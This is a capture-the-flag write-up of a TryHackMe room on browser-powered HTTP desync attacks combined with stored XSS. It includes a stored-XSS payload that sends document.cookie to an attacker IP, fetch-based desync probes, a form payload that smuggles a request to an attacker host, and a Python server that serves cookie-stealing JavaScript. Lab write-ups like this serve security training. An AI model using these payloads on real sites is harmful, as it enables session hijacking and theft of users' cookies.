# Summary 
- link https://tryhackme.com/room/requestsmugglingbrowserdesync
- skills required XSS, python, javascript, HTTP browser desync
- additional readings: https://portswigger.net/research/browser-powered-desync-attacks
- Question. why the desync didn't work when the browser was proxy via burp?

# Write-up to get the flag (not the right way)
- to confirm vulnerability on HTTP Browser Desync, connection was checked to be keep-alive.
  <img width="861" height="629" alt="Screenshot from 2025-10-03 10-00-24" src="https://github.com/user-attachments/assets/a8f71f80-b033-4a4a-a3f1-6f34b2229f3a" />
- to combine with XSS there need to be a point to inject XSS. This page didn't allow sign up or login. The link 'Help' is for a Contact Us page.
- A simple payload was tested but wasn't executed.
  <img width="861" height="629" alt="image" src="https://github.com/user-attachments/assets/aa6a25fb-014d-40f6-b816-1ff3e528998c" />
- to check if the XSS is executed in the backend I tried another payload
  <img width="861" height="629" alt="Screenshot from 2025-10-03 10-12-29" src="https://github.com/user-attachments/assets/db8a9b0f-5e9b-44a6-bfbb-f6f07ef24ad1" />
- It worked. Then there is nothing stopping us to simply using the message field to carry out a XSS attack.
  <img width="1601" height="539" alt="Screenshot from 2025-10-03 10-14-59" src="https://github.com/user-attachments/assets/b23d6e19-b671-455d-b532-887d716a27d4" />
- the new payload is
- `<img src=x onerror="new Image().src='http://10.11.139.184:4440/?='+document.cookie;">`
- again in attack bow fire up `python3 -m http.server 4440`
- Flag obtained.
  <img width="1585" height="614" alt="image" src="https://github.com/user-attachments/assets/6590398c-1bff-4cb1-b53f-d818836ae7bc" />

# Write-up to get the flag (HTTP Browser Desync)
- OK. We are having a stored XSS and keep-alive connect. We can move on to test if the site is vulunable to HTTP Browser Desync attack.
- Then in the follow hour I was trouble shooting trying to understand why the injection didn't work in console to desync the supposingly vulunable site.
```javascript
fetch('http://challenge.thm', {
    method: 'POST',
    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
    mode: 'cors',
})
```
- At the end I found it didn't work when it was proxy through burp. Then I closed burp and proceed. Below screenshot was for illustration. The step-by-step testing was, first put the script in console and enter. Then refresh the page, and it would display Not Found.
  <img width="1036" height="369" alt="image" src="https://github.com/user-attachments/assets/87e67811-f4c4-4334-94b9-a1d3743a96af" />
- Ok. The difficult part is here.
- Step 1: The new payload should be pointing to own server to get a malicious javascript. This was given in task 5.
```javascript
<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://YOUR_IP HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```
- Step 2: the malicious Javascript shall send the cookies with flag to own server.
- to accomplish both step 1 and step 2, we need a python code listening to different port, with one port giving status code 200 and the malcious javascript, and another port accepting and display the cookie retrieved.
- these are the final payloads:
```javascript
<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://10.11.139.184:5555 HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```
- the python code to setup servers to offer malicious script
```python
#!/usr/bin/python3
from http.server import BaseHTTPRequestHandler, HTTPServer

class MaliciousHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Serve malicious JavaScript on ANY request
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"fetch('http://10.11.139.184:4444/?cookies=' + document.cookie)")
        print("Sent malicious JavaScript to victim")

print("Malicious server running on port 5555 to provide malicious JavaScript.")
print("\nStart python3 -m server.http 4444 to receive cookies stolen cookies.")
HTTPServer(('', 5555), MaliciousHandler).serve_forever()
```
- print screen for entry of the first javascript payload
- <img width="422" height="554" alt="image" src="https://github.com/user-attachments/assets/cb0aac12-bc67-4321-adfc-1d61a0726b97" />
- it's working
  <img width="1522" height="882" alt="image" src="https://github.com/user-attachments/assets/cc8fa357-4bb8-4619-844a-7507366e5633" />



